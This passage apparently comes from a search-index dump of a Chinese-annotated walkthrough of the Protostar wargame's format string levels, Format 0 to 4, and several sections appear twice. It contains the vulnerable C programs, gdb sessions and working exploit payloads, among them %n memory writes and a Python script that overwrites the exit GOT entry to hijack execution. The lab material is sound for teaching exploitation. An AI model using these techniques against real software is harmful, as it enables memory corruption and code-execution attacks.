) disassemble main Dump of assembler code for function main: 0x0804841c <main+0>: push ebp 0x0804841d <main+1>: mov ebp,esp 0x0804841f <main+3>: and esp,0xfffffff0 0x08048422 <main+6>: sub esp,0x10 0x08048425 <main+9>: mov eax,DWORD PTR [ ebp+0xc ] 0x08048428 <main+12>: add eax,0x4 0x0804842b <main+15>: mov eax,DWORD PTR [ eax ] 0x0804842d <main+17>: mov DWORD PTR [ esp ] ,eax 0x08048430 <main+20>: call 0x80483f4 <vuln> 0x08048435 <main+25>: leave 0x08048436 <main+26>: ret End of assembler dump. ( gdb ) break *0x08048430 Breakpoint 1 at 0x8048430: file format1/format1.c, line 19 . ( gdb ) disassemble vuln Dump of assembler code for function vuln: 0x080483f4 <vuln+0>: push ebp 0x080483f5 <vuln+1>: mov ebp,esp 0x080483f7 <vuln+3>: sub esp,0x18 0x080483fa <vuln+6>: mov eax,DWORD PTR [ ebp+0x8 ] 0x080483fd <vuln+9>: mov DWORD PTR [ esp ] ,eax 0x08048400 <vuln+12>: call 0x8048320 <printf@plt> 0x08048405 <vuln+17>: mov eax,ds:0x8049638 0x0804840a <vuln+22>: test eax,eax 0x0804840c <vuln+24>: je 0x804841a <vuln+38> 0x0804840e <vuln+26>: mov DWORD PTR [ esp ] ,0x8048500 0x08048415 <vuln+33>: call 0x8048330 <puts@plt> 0x0804841a <vuln+38>: leave 0x0804841b <vuln+39>: ret End of assembler dump. ( gdb ) break *0x08048400 Breakpoint 2 at 0x8048400: file format1/format1.c, line 10 . ( gdb ) define hook-stop >x/1i $eip >end '%x' * 10 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 ( gdb ) r \"`python -c \" print ( '%x' * 10 ) \"`\" Starting program: /opt/protostar/bin/format1 \"`python -c \" print ( '%x' * 10 ) \"`\" 0x8048430 <main+20>: call 0x80483f4 <vuln> Breakpoint 1 , 0x08048430 in main ( argc = 2 , argv = 0xbffff744 ) at format1/format1.c:19 19 in format1/format1.c ( gdb ) x/wx $esp 0xbffff680: 0xbffff89f ( gdb ) c Continuing. 0x8048400 <vuln+12>: call 0x8048320 <printf@plt> Breakpoint 2 , 0x08048400 in vuln ( string = 0xbffff89f \"%x%x%x%x%x%x%x%x%x%x\" ) at format1/format1.c:10 10 in format1/format1.c ( gdb ) x/10wx $esp # (0xbffff89f - 0xbffff660) % 4 = 3 0xbffff660: 0xbffff89f 0x0804960c 0xbffff698 0x08048469 0xbffff670: 0xb7fd8304 0xb7fd7ff4 0xbffff698 0x08048435 0xbffff680: 0xbffff89f 0xb7ff1040 ( gdb ) c Continuing. 804960cbffff6988048469b7fd8304b7fd7ff4bffff6988048435bffff89fb7ff1040804845b Program exited normally. '%x ' * 10 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 ( gdb ) r \"`python -c \" print ( '%x ' * 10 ) \"`\" Starting program: /opt/protostar/bin/format1 \"`python -c \" print ( '%x ' * 10 ) \"`\" 0x8048430 <main+20>: call 0x80483f4 <vuln> Breakpoint 1 , 0x08048430 in main ( argc = 2 , argv = 0xbffff734 ) at format1/format1.c:19 19 in format1/format1.c ( gdb ) x/wx $esp 0xbffff670: 0xbffff895 ( gdb ) c Continuing. 0x8048400 <vuln+12>: call 0x8048320 <printf@plt> Breakpoint 2 , 0x08048400 in vuln ( string = 0xbffff895 \"%x %x %x %x %x %x %x %x %x %x \" ) at format1/format1.c:10 10 in format1/format1.c ( gdb ) x/16wx $esp 0xbffff650: 0xbffff895 0x0804960c 0xbffff688 0x08048469 0xbffff660: 0xb7fd8304 0xb7fd7ff4 0xbffff688 0x08048435 0xbffff670: 0xbffff895 0xb7ff1040 0x0804845b 0xb7fd7ff4 0xbffff680: 0x08048450 0x00000000 0xbffff708 0xb7eadc76 ( gdb ) c Continuing. 804960c bffff688 8048469 b7fd8304 b7fd7ff4 bffff688 8048435 bffff895 b7ff1040 804845b Program exited normally. Exploit \u00b6 1 2 $ ./format1 \" $( python -c \"print 'A' * 4 + '\\x38\\x96\\x04\\x08' + 'B' * 7 + '%x' * 135 + '%n'\" ) \" AAAA8BBBBBBB804960cbffff5d88048469b7fd8304b7fd7ff4bffff5d88048435bffff7bcb7ff1040804845bb7fd7ff480484500bffff658b7eadc762bffff684bffff690b7fe1848bffff640ffffffffb7ffeff4804824d1bffff640b7ff0626b7fffab0b7fe1b28b7fd7ff400bffff658e8c9752abb7f65000280483400b7ff6210b7eadb9bb7ffeff42804834008048361804841c2bffff68480484508048440b7ff1040bffff67cb7fff8f82bffff7b2bffff7bc0bffff8dcbffff8f1bffff908bffff920bffff92ebffff942bffff963bffff97abffff98dbffff997bffffe87bffffea0bffffedebffffef2bfffff10bfffff27bfffff38bfffff53bfffff5bbfffff6bbfffff78bfffffacbfffffc0bfffffd4bfffffe6020b7fe241421b7fe200010178bfbbf61000116438048034420577b7fe30008098048340b3e9c0d3e9e3e917119bffff79b1fbffffff2fbffff7ab00120000008433fc8b69057f81755be21d6923a08e3638362f2e00006d726f6631746141414141you have modified the target : ) Format 2 \u00b6 how specific values can be written in memory 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 #include <stdlib.h> #include <unistd.h> #include <stdio.h> #include <string.h> int target ; void vuln () { char buffer [ 512 ]; fgets ( buffer , sizeof ( buffer ), stdin ); // char *fgets(char *s, int size, FILE *stream); printf ( buffer ); if ( target == 64 ) { printf ( \"you have modified the target :) \\n \" ); } else { printf ( \"target is %d :( \\n \" , target ); } } int main ( int argc , char ** argv ) { vuln (); } \u53d8\u91cf target \u5bf9\u5e94\u7684\u5730\u5740 1 2 $ objdump -t format2 | grep target 080496e4 g O .bss 00000004 target \u89c2\u5bdf\u8f93\u5165\u5b57\u7b26\u4e32\u5728\u6808\u4e2d\u7684\u4f4d\u7f6e 1 2 3 $ python -c \"print('%x ' * 20)\" | ./format2 200 b7fd8420 bffff514 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 b7ff000a 0 target is 0 : ( \u901a\u8fc7 %x \u4ece\u6808\u4e2d\u53d6\u53c2\u6570\u76f4\u5230\u8bfb\u5230\u76ee\u6807 080496e4 \uff0c\u8bbe\u9700\u8981 %x \uff08\u5360 \\(2\\) \u4e2a\u5b57\u8282\uff09 \u7684\u6570\u91cf\u4e3a \\(x\\) \uff0c \\(2x/4 + 3 = x\\) \u89e3\u5f97 \\(x=6\\) \u5728 %n \u524d\u9700\u6253\u5370 \\(64\\) \u4e2a\u5b57\u7b26\uff0c\u901a\u8fc7 %x \u5171\u8ba1\u6253\u5370 \\(6 \\times 8 - 5 = 43\\) \u4e2a\u5b57\u7b26\uff0c\u52a0\u4e0a \\xe4\\x96\\x04\\x08 \uff0c\u8fd8\u9700\u518d\u8865\u5145 \\(17\\) \u4e2a\u5b57\u7b26 \u5f53\u7136\uff0c\u53ef\u4ee5\u7b80\u5355\u5730\u901a\u8fc7 $ \u6765\u51b3\u5b9a\u53d6\u7b2c\u51e0\u4e2a\u53c2\u6570 Exploit \u00b6 1 2 3 4 5 6 7 $ python -c \"print('%x' * 6 + '\\xe4\\x96\\x04\\x08' + 'A' * 17 + '%n')\" | ./format2 200b7fd8420bffff514782578257825782578257825AAAAAAAAAAAAAAAAA you have modified the target : ) # Simple Version $ python -c \"print('\\xe4\\x96\\x04\\x08' + 'A' * 60 + '%4\\$n')\" | ./format2 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA you have modified the target : ) Format 3 \u00b6 how to write more than 1 or 2 bytes of memory to the process 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 #include <stdlib.h> #include <unistd.h> #include <stdio.h> #include <string.h> int target ; void printbuffer ( char * string ) { printf ( string ); } void vuln () { char buffer [ 512 ]; fgets ( buffer , sizeof ( buffer ), stdin ); printbuffer ( buffer ); if ( target == 0x01025544 ) { printf ( \"you have modified the target :) \\n \" ); } else { printf ( \"target is %08x :( \\n \" , target ); } } int main ( int argc , char ** argv ) { vuln (); } \u53d8\u91cf target \u5bf9\u5e94\u7684\u5730\u5740 1 2 $ objdump -t format3 | grep target 080496f4 g O .bss 00000004 target \u89c2\u5bdf\u8f93\u5165\u5b57\u7b26\u4e32\u5728\u6808\u4e2d\u7684\u4f4d\u7f6e 1 2 3 $ python -c \"print('%x ' * 20)\" | ./format3 0 bffff4d0 b7fd7ff4 0 0 bffff6d8 804849d bffff4d0 200 b7fd8420 bffff514 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 target is 00000000 : ( target \u7684\u76ee\u6807\u503c\u4e3a 0x01025544 \uff0c\u800c\u8f93\u5165\u9650\u5236\u957f\u5ea6\u4e3a 512 \u5b57\u7b26\uff0c\u53ef\u4ee5\u901a\u8fc7\u8bbe\u7f6e\u8f93\u51fa\u6700\u5c0f\u5bbd\u5ea6\u6765\u8865\u8db3\u5b57\u7b26 Exploit \u00b6 1 2 3 4 $ python -c \"print('\\xf4\\x96\\x04\\x08' + '%16930112x' + '%12\\$n')\" | ./format3 ... 0 you have modified the target : ) Format 4 \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 #include <stdlib.h> #include <unistd.h> #include <stdio.h> #include <string.h> int target ; void hello () { printf ( \"code execution redirected! you win \\n \" ); _exit ( 1 ); } void vuln () { char buffer [ 512 ]; fgets ( buffer , sizeof ( buffer ), stdin ); printf ( buffer ); exit ( 1 ); } int main ( int argc , char ** argv ) { vuln (); } \u83b7\u53d6 hello \u51fd\u6570\u7684\u5730\u5740 1 2 3 4 5 $ objdump -t format4 | grep hello 080484b4 g F .text 0000001e hello $ gdb ./format4 ( gdb ) x hello 0x80484b4 <hello>: 0x83e58955 \u83b7\u53d6 GOT \u8868 exit \u51fd\u6570\u7684\u6761\u76ee\u5730\u5740 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 ( gdb ) set disassembly-flavor intel ( gdb ) disassemble vuln Dump of assembler code for function vuln: 0x080484d2 <vuln+0>: push ebp 0x080484d3 <vuln+1>: mov ebp,esp 0x080484d5 <vuln+3>: sub esp,0x218 0x080484db <vuln+9>: mov eax,ds:0x8049730 0x080484e0 <vuln+14>: mov DWORD PTR [ esp+0x8 ] ,eax 0x080484e4 <vuln+18>: mov DWORD PTR [ esp+0x4 ] ,0x200 0x080484ec <vuln+26>: lea eax, [ ebp-0x208 ] 0x080484f2 <vuln+32>: mov DWORD PTR [ esp ] ,eax 0x080484f5 <vuln+35>: call 0x804839c <fgets@plt> 0x080484fa <vuln+40>: lea eax, [ ebp-0x208 ] 0x08048500 <vuln+46>: mov DWORD PTR [ esp ] ,eax 0x08048503 <vuln+49>: call 0x80483cc <printf@plt> 0x08048508 <vuln+54>: mov DWORD PTR [ esp ] ,0x1 0x0804850f <vuln+61>: call 0x80483ec <exit@plt> End of assembler dump. ( gdb ) disassemble 0x80483ec Dump of assembler code for function exit@plt: 0x080483ec <exit@plt+0>: jmp DWORD PTR ds:0x8049724 0x080483f2 <exit@plt+6>: push 0x30 0x080483f7 <exit@plt+11>: jmp 0x804837c End of assembler dump. ( gdb ) x 0x8049724 0x8049724 <_GLOBAL_OFFSET_TABLE_+36>: 0x080483f2 \u6d4b\u8bd5\u8986\u76d6 exit \u51fd\u6570 GOT \u8868\u6761\u76ee\u8df3\u8f6c hello \u51fd\u6570\u7684\u53ef\u884c\u6027 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 ( gdb ) break *0x08048508 Breakpoint 1 at 0x8048508: file format4/format4.c, line 22 . ( gdb ) r Starting program: /opt/protostar/bin/format4 Test input Test input Breakpoint 1 , vuln () at format4/format4.c:22 22 format4/format4.c: No such file or directory. in format4/format4.c ( gdb ) set { int } 0x8049724 = 0x80484b4 ( gdb ) x 0x8049724 0x8049724 <_GLOBAL_OFFSET_TABLE_+36>: 0x080484b4 ( gdb ) c Continuing. code execution redirected! you win Program exited with code 01 . \u89c2\u5bdf\u8f93\u5165\u5b57\u7b26\u4e32\u5728\u6808\u4e2d\u7684\u4f4d\u7f6e 1 2 $ python -c \"print('%x ' * 20)\" | ./format4 200 b7fd8420 bffff524 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 b7ff000a 0 0x080484b4 \u8f83\u5927\uff0c\u76f4\u63a5\u901a\u8fc7\u8bbe\u7f6e\u8f93\u51fa\u6700\u5c0f\u5bbd\u5ea6\u6765\u8865\u8db3\u5b57\u7b26\u7684\u8bdd\u6253\u5370\u4f1a\u6d88\u8017\u8f83\u957f\u65f6\u95f4\uff0c\u53ef\u4ee5\u62c6\u5206\u6210\u4e24\u90e8\u5206\u8fdb\u884c\u4fee\u6539 \u5b9e\u9645\u6bcf\u6b21\u4fee\u6539 \\(4\\) \u5b57\u8282 Exploit \u00b6 1 2 3 4 5 6 7 8 9 10 11 import struct exit_got = 0x08049724 exploit = '' exploit += struct . pack ( 'I' , exit_got ) exploit += struct . pack ( 'I' , exit_got + 2 ) exploit += ' %33964x ' # 0x84b4 - 8 exploit += '%4$n' exploit += ' %33616x ' # 0x10804 - 0x84b4 exploit += '%5$n' print exploit 1 2 3 4 $ python /tmp/format.py | ./format4 ... b7fd8420 code execution redirected! you win","title":"Format"},{"location":"wargames/protostar/format/#format-0","text":"This level should be done in less than 10 bytes of input 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 #include <stdlib.h> #include <unistd.h> #include <stdio.h> #include <string.h> void vuln ( char * string ) { volatile int target ; char buffer [ 64 ]; target = 0 ; sprintf ( buffer , string ); // int sprintf(char *str, const char *format, ...); if ( target == 0xdeadbeef ) { printf ( \"you have hit the target correctly :) \\n \" ); } } int main ( int argc , char ** argv ) { vuln ( argv [ 1 ]); } \u9996\u5148\u8fd8\u662f\u6d4b\u4e00\u4e0b\u9700\u8981\u8986\u76d6\u7684\u4f4d\u7f6e 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 $ gdb ./format0 ( gdb ) set disassembly-flavor intel ( gdb ) disassemble vuln Dump of assembler code for function vuln: 0x080483f4 <vuln+0>: push ebp 0x080483f5 <vuln+1>: mov ebp,esp 0x080483f7 <vuln+3>: sub esp,0x68 0x080483fa <vuln+6>: mov DWORD PTR [ ebp-0xc ] ,0x0 0x08048401 <vuln+13>: mov eax,DWORD PTR [ ebp+0x8 ] 0x08048404 <vuln+16>: mov DWORD PTR [ esp+0x4 ] ,eax 0x08048408 <vuln+20>: lea eax, [ ebp-0x4c ] 0x0804840b <vuln+23>: mov DWORD PTR [ esp ] ,eax 0x0804840e <vuln+26>: call 0x8048300 <sprintf@plt> 0x08048413 <vuln+31>: mov eax,DWORD PTR [ ebp-0xc ] 0x08048416 <vuln+34>: cmp eax,0xdeadbeef 0x0804841b <vuln+39>: jne 0x8048429 <vuln+53> 0x0804841d <vuln+41>: mov DWORD PTR [ esp ] ,0x8048510 0x08048424 <vuln+48>: call 0x8048330 <puts@plt> 0x08048429 <vuln+53>: leave 0x0804842a <vuln+54>: ret End of assembler dump. ( gdb ) break *0x0804840e ( gdb ) define hook-stop Type commands for definition of \"hook-stop\" . End with a line saying just \"end\" . >x/1i $eip >end ( gdb ) r $( cat /tmp/test ) Starting program: /opt/protostar/bin/format0 $( cat /tmp/test ) 0x804840e <vuln+26>: call 0x8048300 <sprintf@plt> Breakpoint 1 , 0x0804840e in vuln ( string = 0xbffff84b \"AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ\" ) at format0/format0.c:13 13 in format0/format0.c ( gdb ) ni 0x8048413 <vuln+31>: mov eax,DWORD PTR [ ebp-0xc ] 15 in format0/format0.c ( gdb ) si 0x8048416 <vuln+34>: cmp eax,0xdeadbeef 0x08048416 15 in format0/format0.c ( gdb ) info registers eax 0x51515151 1364283729 # Q ... sprintf \u5e76\u4e0d\u4f1a\u68c0\u67e5\u683c\u5f0f\u5b57\u7b26\u4e32\u9700\u8981\u7684\u53c2\u6570\u4e0e\u5b9e\u9645\u63d0\u4f9b\u7684\u53c2\u6570\u662f\u5426\u5339\u914d\uff0c\u53ea\u662f\u6839\u636e\u683c\u5f0f\u5b57\u7b26\u4e32\u4ece\u6808\u4e2d\u53d6\u53c2\u6570","title":"Format 0"},{"location":"wargames/protostar/format/#exploit","text":"1 2 3 import struct target = struct . pack ( 'I' , 0xdeadbeef ) print ' %64s ' + target 1 2 $ ./format0 $( python /tmp/format.py ) you have hit the target correctly : )","title":"Exploit"},{"location":"wargames/protostar/format/#format-1","text":"modify arbitrary memory locations 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 #include <stdlib.h> #include <unistd.h> #include <stdio.h> #include <string.h> int target ; void vuln ( char * string ) { printf ( string ); if ( target ) { printf ( \"you have modified the target :) \\n \" ); } } int main ( int argc , char ** argv ) { vuln ( argv [ 1 ]); } printf \u4e0e sprintf \u7c7b\u4f3c\uff0c\u53ea\u662f\u6839\u636e\u683c\u5f0f\u5b57\u7b26\u4e32\u4ece\u6808\u4e2d\u53d6\u53c2\u6570 \u53ef\u7528\u4e8e\u67e5\u770b\u5185\u5b58\u4fe1\u606f man 3 printf Code such as printf(foo); If foo comes from untrusted user input, it may contain %n, causing the printf() call to write to memory and creating a security hole. %n \u7528\u4e8e\u5c06\u5148\u524d\u5df2\u7ecf\u6253\u5370\u7684\u5b57\u7b26\u6570\u91cf\u5b58\u50a8\u4e8e\u6307\u9488\u6307\u5411\u7684\u6574\u578b\u53d8\u91cf \u83b7\u53d6\u53d8\u91cf target \u7684\u5730\u5740 1 2 $ objdump -t format1 | grep target 08049638 g O .bss 00000004 target \u51fd\u6570\u53c2\u6570\u5c06\u538b\u5165\u6808\u4e2d\uff0c\u82e5 08049638 \u65e0\u6cd5\u76f4\u63a5\u5728\u6808\u4e0a\u627e\u5230\uff0c\u53ef\u4ee5\u901a\u8fc7\u4f20\u53c2\u63a7\u5236 \u4e0d\u540c\u957f\u5ea6\u7684\u4f20\u53c2\u4e5f\u5f71\u54cd\u7740\u6808\uff0c\u9700\u8981\u5c1d\u8bd5\u4e0d\u540c\u7684\u957f\u5ea6\u4f7f\u5f97 ESP \u4e0e\u5b57\u7b26\u4e32\u8d77\u59cb\u5730\u5740\u7684\u5dee\u503c\u4e3a \\(4\\) \u7684\u500d\u6570\uff0c\u4ece\u800c\u80fd\u6070\u597d\u8bfb\u5230 08049638 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 $ gdb ./format1 ( gdb ) set disassembly-flavor intel ( gdb ) disassemble main Dump of assembler code for function main: 0x0804841c <main+0>: push ebp 0x0804841d <main+1>: mov ebp,esp 0x0804841f <main+3>: and esp,0xfffffff0 0x08048422 <main+6>: sub esp,0x10 0x08048425 <main+9>: mov eax,DWORD PTR [ ebp+0xc ] 0x08048428 <main+12>: add eax,0x4 0x0804842b <main+15>: mov eax,DWORD PTR [ eax ] 0x0804842d <main+17>: mov DWORD PTR [ esp ] ,eax 0x08048430 <main+20>: call 0x80483f4 <vuln> 0x08048435 <main+25>: leave 0x08048436 <main+26>: ret End of assembler dump. ( gdb ) break *0x08048430 Breakpoint 1 at 0x8048430: file format1/format1.c, line 19 . ( gdb ) disassemble vuln Dump of assembler code for function vuln: 0x080483f4 <vuln+0>: push ebp 0x080483f5 <vuln+1>: mov ebp,esp 0x080483f7 <vuln+3>: sub esp,0x18 0x080483fa <vuln+6>: mov eax,DWORD PTR [ ebp+0x8 ] 0x080483fd <vuln+9>: mov DWORD PTR [ esp ] ,eax 0x08048400 <vuln+12>: call 0x8048320 <printf@plt> 0x08048405 <vuln+17>: mov eax,ds:0x8049638 0x0804840a <vuln+22>: test eax,eax 0x0804840c <vuln+24>: je 0x804841a <vuln+38> 0x0804840e <vuln+26>: mov DWORD PTR [ esp ] ,0x8048500 0x08048415 <vuln+33>: call 0x8048330 <puts@plt> 0x0804841a <vuln+38>: leave 0x0804841b <vuln+39>: ret End of assembler dump. ( gdb ) break *0x08048400 Breakpoint 2 at 0x8048400: file format1/format1.c, line 10 . ( gdb ) define hook-stop >x/1i $eip >end '%x' * 10 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 ( gdb ) r \"`python -c \" print ( '%x' * 10 ) \"`\" Starting program: /opt/protostar/bin/format1 \"`python -c \" print ( '%x' * 10 ) \"`\" 0x8048430 <main+20>: call 0x80483f4 <vuln> Breakpoint 1 , 0x08048430 in main ( argc = 2 , argv = 0xbffff744 ) at format1/format1.c:19 19 in format1/format1.c ( gdb ) x/wx $esp 0xbffff680: 0xbffff89f ( gdb ) c Continuing. 0x8048400 <vuln+12>: call 0x8048320 <printf@plt> Breakpoint 2 , 0x08048400 in vuln ( string = 0xbffff89f \"%x%x%x%x%x%x%x%x%x%x\" ) at format1/format1.c:10 10 in format1/format1.c ( gdb ) x/10wx $esp # (0xbffff89f - 0xbffff660) % 4 = 3 0xbffff660: 0xbffff89f 0x0804960c 0xbffff698 0x08048469 0xbffff670: 0xb7fd8304 0xb7fd7ff4 0xbffff698 0x08048435 0xbffff680: 0xbffff89f 0xb7ff1040 ( gdb ) c Continuing. 804960cbffff6988048469b7fd8304b7fd7ff4bffff6988048435bffff89fb7ff1040804845b Program exited normally. '%x ' * 10 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 ( gdb ) r \"`python -c \" print ( '%x ' * 10 ) \"`\" Starting program: /opt/protostar/bin/format1 \"`python -c \" print ( '%x ' * 10 ) \"`\" 0x8048430 <main+20>: call 0x80483f4 <vuln> Breakpoint 1 , 0x08048430 in main ( argc = 2 , argv = 0xbffff734 ) at format1/format1.c:19 19 in format1/format1.c ( gdb ) x/wx $esp 0xbffff670: 0xbffff895 ( gdb ) c Continuing. 0x8048400 <vuln+12>: call 0x8048320 <printf@plt> Breakpoint 2 , 0x08048400 in vuln ( string = 0xbffff895 \"%x %x %x %x %x %x %x %x %x %x \" ) at format1/format1.c:10 10 in format1/format1.c ( gdb ) x/16wx $esp 0xbffff650: 0xbffff895 0x0804960c 0xbffff688 0x08048469 0xbffff660: 0xb7fd8304 0xb7fd7ff4 0xbffff688 0x08048435 0xbffff670: 0xbffff895 0xb7ff1040 0x0804845b 0xb7fd7ff4 0xbffff680: 0x08048450 0x00000000 0xbffff708 0xb7eadc76 ( gdb ) c Continuing. 804960c bffff688 8048469 b7fd8304 b7fd7ff4 bffff688 8048435 bffff895 b7ff1040 804845b Program exited normally.","title":"Format 1"},{"location":"wargames/protostar/format/#exploit_1","text":"1 2 $ ./format1 \" $( python -c \"print 'A' * 4 + '\\x38\\x96\\x04\\x08' + 'B' * 7 + '%x' * 135 + '%n'\" ) \" AAAA8BBBBBBB804960cbffff5d88048469b7fd8304b7fd7ff4bffff5d88048435bffff7bcb7ff1040804845bb7fd7ff480484500bffff658b7eadc762bffff684bffff690b7fe1848bffff640ffffffffb7ffeff4804824d1bffff640b7ff0626b7fffab0b7fe1b28b7fd7ff400bffff658e8c9752abb7f65000280483400b7ff6210b7eadb9bb7ffeff42804834008048361804841c2bffff68480484508048440b7ff1040bffff67cb7fff8f82bffff7b2bffff7bc0bffff8dcbffff8f1bffff908bffff920bffff92ebffff942bffff963bffff97abffff98dbffff997bffffe87bffffea0bffffedebffffef2bfffff10bfffff27bfffff38bfffff53bfffff5bbfffff6bbfffff78bfffffacbfffffc0bfffffd4bfffffe6020b7fe241421b7fe200010178bfbbf61000116438048034420577b7fe30008098048340b3e9c0d3e9e3e917119bffff79b1fbffffff2fbffff7ab00120000008433fc8b69057f81755be21d6923a08e3638362f2e00006d726f6631746141414141you have modified the target : )","title":"Exploit"},{"location":"wargames/protostar/format/#format-2","text":"how specific values can be written in memory 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 #include <stdlib.h> #include <unistd.h> #include <stdio.h> #include <string.h> int target ; void vuln () { char buffer [ 512 ]; fgets ( buffer , sizeof ( buffer ), stdin ); // char *fgets(char *s, int size, FILE *stream); printf ( buffer ); if ( target == 64 ) { printf ( \"you have modified the target :) \\n \" ); } else { printf ( \"target is %d :( \\n \" , target ); } } int main ( int argc , char ** argv ) { vuln (); } \u53d8\u91cf target \u5bf9\u5e94\u7684\u5730\u5740 1 2 $ objdump -t format2 | grep target 080496e4 g O .bss 00000004 target \u89c2\u5bdf\u8f93\u5165\u5b57\u7b26\u4e32\u5728\u6808\u4e2d\u7684\u4f4d\u7f6e 1 2 3 $ python -c \"print('%x ' * 20)\" | ./format2 200 b7fd8420 bffff514 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 b7ff000a 0 target is 0 : ( \u901a\u8fc7 %x \u4ece\u6808\u4e2d\u53d6\u53c2\u6570\u76f4\u5230\u8bfb\u5230\u76ee\u6807 080496e4 \uff0c\u8bbe\u9700\u8981 %x \uff08\u5360 \\(2\\) \u4e2a\u5b57\u8282\uff09 \u7684\u6570\u91cf\u4e3a \\(x\\) \uff0c \\(2x/4 + 3 = x\\) \u89e3\u5f97 \\(x=6\\) \u5728 %n \u524d\u9700\u6253\u5370 \\(64\\) \u4e2a\u5b57\u7b26\uff0c\u901a\u8fc7 %x \u5171\u8ba1\u6253\u5370 \\(6 \\times 8 - 5 = 43\\) \u4e2a\u5b57\u7b26\uff0c\u52a0\u4e0a \\xe4\\x96\\x04\\x08 \uff0c\u8fd8\u9700\u518d\u8865\u5145 \\(17\\) \u4e2a\u5b57\u7b26 \u5f53\u7136\uff0c\u53ef\u4ee5\u7b80\u5355\u5730\u901a\u8fc7 $ \u6765\u51b3\u5b9a\u53d6\u7b2c\u51e0\u4e2a\u53c2\u6570","title":"Format 2"},{"location":"wargames/protostar/format/#exploit_2","text":"1 2 3 4 5 6 7 $ python -c \"print('%x' * 6 + '\\xe4\\x96\\x04\\x08' + 'A' * 17 + '%n')\" | ./format2 200b7fd8420bffff514782578257825782578257825AAAAAAAAAAAAAAAAA you have modified the target : ) # Simple Version $ python -c \"print('\\xe4\\x96\\x04\\x08' + 'A' * 60 + '%4\\$n')\" | ./format2 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA you have modified the target : )","title":"Exploit"},{"location":"wargames/protostar/format/#format-3","text":"how to write more than 1 or 2 bytes of memory to the process 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 #include <stdlib.h> #include <unistd.h> #include <stdio.h> #include <string.h> int target ; void printbuffer ( char * string ) { printf ( string ); } void vuln () { char buffer [ 512 ]; fgets ( buffer , sizeof ( buffer ), stdin ); printbuffer ( buffer ); if ( target == 0x01025544 ) { printf ( \"you have modified the target :) \\n \" ); } else { printf ( \"target is %08x :( \\n \" , target ); } } int main ( int argc , char ** argv ) { vuln (); } \u53d8\u91cf target \u5bf9\u5e94\u7684\u5730\u5740 1 2 $ objdump -t format3 | grep target 080496f4 g O .bss 00000004 target \u89c2\u5bdf\u8f93\u5165\u5b57\u7b26\u4e32\u5728\u6808\u4e2d\u7684\u4f4d\u7f6e 1 2 3 $ python -c \"print('%x ' * 20)\" | ./format3 0 bffff4d0 b7fd7ff4 0 0 bffff6d8 804849d bffff4d0 200 b7fd8420 bffff514 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 target is 00000000 : ( target \u7684\u76ee\u6807\u503c\u4e3a 0x01025544 \uff0c\u800c\u8f93\u5165\u9650\u5236\u957f\u5ea6\u4e3a 512 \u5b57\u7b26\uff0c\u53ef\u4ee5\u901a\u8fc7\u8bbe\u7f6e\u8f93\u51fa\u6700\u5c0f\u5bbd\u5ea6\u6765\u8865\u8db3\u5b57\u7b26","title":"Format 3"},{"location":"wargames/protostar/format/#exploit_3","text":"1 2 3 4 $ python -c \"print('\\xf4\\x96\\x04\\x08' + '%16930112x' + '%12\\$n')\" | ./format3 ... 0 you have modified the target : )","title":"Exploit"},{"location":"wargames/protostar/format/#format-4","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 #include <stdlib.h> #include <unistd.h> #include <stdio.h> #include <string.h> int target ; void hello () { printf ( \"code execution redirected! you win \\n \" ); _exit ( 1 ); } void vuln () { char buffer [ 512 ]; fgets ( buffer , sizeof ( buffer ), stdin ); printf ( buffer ); exit ( 1 ); } int main ( int argc , char ** argv ) { vuln (); } \u83b7\u53d6 hello \u51fd\u6570\u7684\u5730\u5740 1 2 3 4 5 $ objdump -t format4 | grep hello 080484b4 g F .text 0000001e hello $ gdb ./format4 ( gdb ) x hello 0x80484b4 <hello>: 0x83e58955 \u83b7\u53d6 GOT \u8868 exit \u51fd\u6570\u7684\u6761\u76ee\u5730\u5740 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 ( gdb ) set disassembly-flavor intel ( gdb ) disassemble vuln Dump of assembler code for function vuln: 0x080484d2 <vuln+0>: push ebp 0x080484d3 